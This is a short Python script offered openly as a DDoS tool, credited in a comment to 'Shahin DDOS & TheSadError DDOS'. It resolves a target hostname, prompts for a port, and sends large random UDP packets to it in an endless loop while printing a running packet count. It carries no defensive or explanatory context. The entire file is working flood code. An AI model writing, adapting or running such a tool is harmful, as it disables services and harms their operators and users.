import socket 
from colorama import * 
import os 
import requests
import random 

def ddos(url):
    port = int(input(Fore.BLUE+"[+] Target port : "))
    ip = socket.gethostbyname(url)
    bytes = random._urandom(10084)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    t = 0
    for i in range(0, 500):
        while True :
            s.sendto(bytes,(ip,port))
            t += 1
            print(f"Packets sent {t} , to {ip} with port {port}")

    # Shahin DDOS & TheSadError DDOS
